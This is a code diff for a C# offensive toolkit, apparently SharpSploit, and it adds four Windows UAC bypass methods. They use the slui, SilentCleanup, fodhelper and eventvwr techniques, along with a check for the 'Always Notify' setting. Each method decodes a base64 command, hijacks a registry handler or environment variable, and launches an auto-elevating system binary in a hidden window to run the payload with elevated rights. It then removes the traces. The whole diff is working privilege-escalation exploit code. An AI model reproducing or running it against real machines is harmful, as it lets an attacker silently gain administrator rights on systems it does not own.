@@ -5,6 +5,8 @@
 using System;
 using System.Text;
 using System.Linq;
+using System.Threading;
+using Microsoft.Win32;
 using System.Diagnostics;
 using System.ComponentModel;
 using System.Security.Principal;
@@ -261,6 +263,163 @@ namespace SharpSploit.Credentials
                 return this.RevertToSelf();
             }
             return false;
+
+        }
+       public bool AlwaysNotify()
+        {
+            RegistryKey aNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            string consentPrompt = aNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
+            string secureDesktopPrompt = aNotify.GetValue("PromptOnSecureDesktop").ToString();
+            aNotify.Close();
+
+            if (consentPrompt == "2" & secureDesktopPrompt == "1")
+            {
+                System.Console.WriteLine("UAC is set to 'Always Notify.' This attack will fail. Exiting...");
+                return true;
+            }
+            return false;
+        }
+
+
+        public bool BypassUACSlui (string encodedCommand)
+        {
+            //Credit: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
+
+            //Check if UAC is set to 'Always Notify'
+            if (AlwaysNotify()) {
+                return false;
+            }
+
+            //Convert encoded command to a string
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
+
+            //Set the registry key for eventvwr
+            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"exefile\Shell\Open\command");
+
+            RegistryKey sluikey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\Shell\Open\command", true);
+            sluikey.SetValue("", @command);
+            sluikey.Close();
+
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = "C:\\windows\\system32\\slui.exe";
+            p.StartInfo.Verb = "runas";
+            p.Start();
+
+            //sleep 10 seconds to let the payload execute
+            Thread.Sleep(10000);
+
+            //Unset the registry
+            newkey.DeleteSubKeyTree("exefile");
+            return true;
+        }
+
+
+        public bool BypassUACDiskCleanup(string encodedCommand)
+        {
+            //Credit: https://github.com/gushmazuko/WinBypass/blob/master/DiskCleanupBypass_direct.ps1
+
+            //Check if UAC is set to 'Always Notify'
+            if (AlwaysNotify()) {
+		    return false;
+	    }
+
+            //Convert encoded command to a string
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
+
+            //Check that the command ends in "&& REM"
+            if (!command.Contains("REM"))
+            {
+                Console.WriteLine("Command must end in REM. Exiting...");
+		return false;
+            }
+
+            //Set the registry key for eventvwr
+            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Environment", true);
+            newkey.SetValue("windir", @command);
+
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = "C:\\windows\\system32\\schtasks.exe";
+            p.StartInfo.Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I";
+            p.Start();
+
+            //sleep 10 seconds to let the payload execute
+            Thread.Sleep(10000);
+
+            //Unset the registry
+            newkey.DeleteValue("windir");
+            return true;
+        }
+
+        public bool BypassUACFodHelper(string encodedCommand)
+        {
+            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
+
+            //Check if UAC is set to 'Always Notify'
+            if (AlwaysNotify())
+            {
+                return false;
+            }
+            //Convert encoded command to a string
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
+
+            //Set the registry key for fodhelper
+            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
+
+            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
+            fod.SetValue("DelegateExecute", "");
+            fod.SetValue("", @command);
+            fod.Close();
+
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
+            p.Start();
+
+            //sleep 10 seconds to let the payload execute
+            Thread.Sleep(10000);
+
+            //Unset the registry
+            newkey.DeleteSubKeyTree("ms-settings");
+            return true;
+        }
+
+        public bool BypassUACEventVwr(string encodedCommand)
+        {
+            //Credit: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+
+            //Check if UAC is set to 'Always Notify'
+            if(AlwaysNotify()) { return false;  }
+
+            //Convert encoded command to a string
+            string command = Encoding.UTF8.GetString(Convert.FromBase64String(encodedCommand));
+
+            //Set the registry key for eventvwr
+            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+            newkey.CreateSubKey(@"mscfile\Shell\Open\command");
+
+            RegistryKey vwr = Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
+            vwr.SetValue("", @command);
+            vwr.Close();
+
+            //start fodhelper
+            Process p = new Process();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.FileName = "C:\\windows\\system32\\eventvwr.exe";
+            p.Start();
+
+            //sleep 10 seconds to let the payload execute
+            Thread.Sleep(10000);
+
+            //Unset the registry
+            newkey.DeleteSubKeyTree("mscfile");
+            return true;
 
         }
 
